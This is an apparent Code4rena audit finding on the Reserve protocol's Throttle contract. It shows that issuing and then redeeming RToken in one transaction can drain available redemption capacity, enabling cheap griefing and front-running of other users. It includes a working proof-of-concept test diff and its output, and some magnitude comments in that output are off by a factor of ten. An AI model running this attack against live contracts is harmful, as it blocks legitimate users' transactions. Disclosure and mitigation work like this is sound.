## Tags

- 2 (Med Risk)
- satisfactory
- selected for report
- sponsor confirmed
- MR-NEW

# [Attacker can temporary deplete available redemption/issuance by running issuance then redemption or vice versa](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79) 

# Lines of code

https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/libraries/Throttle.sol#L66-L75


# Vulnerability details

## Impact
Attacker can deplete available issuance or redemption by first issuing and then redeeming in the same tx or vice versa.
The available redemption/issuance will eventually grow back, but this temporary reduces the available amount.
This can also use to front run other user who tries to redeem/issue in order to fail their tx. 

## Proof of Concept
In the PoC below a user is able to reduce the redemption available by more than 99% (1e20 to 1e14), and that's without spending anything but gas (they end up with the same amount of RToken as before)



```diff
diff --git a/test/RToken.test.ts b/test/RToken.test.ts
index e04f51db..33044b79 100644
--- a/test/RToken.test.ts
+++ b/test/RToken.test.ts
@@ -1293,6 +1293,31 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {
           )
         })
 
+        it('PoC', async function () {
+          const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR);
+
+          advanceTime(60*60*5);
+
+          let totalSupply =  await rToken.totalSupply();
+          let redemptionAvailable = await rToken.redemptionAvailable();
+          let issuanceAvailable = await rToken.issuanceAvailable();
+
+          console.log({redemptionAvailable, issuanceAvailable, totalSupply});
+
+          let toIssue = redemptionAvailable.mul(111111n).div(100000n);
+          await rToken.connect(addr1).issue(toIssue);
+          await rToken.connect(addr1).redeem(toIssue, true);
+
+
+
+          redemptionAvailable = await rToken.redemptionAvailable();
+          issuanceAvailable = await rToken.issuanceAvailable();
+          console.log("after", {redemptionAvailable, issuanceAvailable});
+          return;
+
+        });
+        return;
+
         it('Should update issuance throttle correctly on redemption', async function () {
           const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR)
 
@@ -1335,6 +1360,7 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {
       })
     })
   })
+  return;
 
   describe('Melt/Mint #fast', () => {
     const issueAmount: BigNumber = bn('100e18')

```

Output:
```
{
  redemptionAvailable: BigNumber { value: "10000000000000000000" }, // 1e20
  issuanceAvailable: BigNumber { value: "1000000000000000000000000" },
  totalSupply: BigNumber { value: "100000000000000000000" }
}
after {
  redemptionAvailable: BigNumber { value: "10000000000000" }, // 1e14
  issuanceAvailable: BigNumber { value: "1000000000000000000000000" }
}
```

## Recommended Mitigation Steps
Mitigating this issue seems a bit tricky.
One way is at the end of `currentlyAvailable()` to return the max of `available` and `throttle.lastAvailable` (up to some limit, in order not to allow to much of it to accumulate).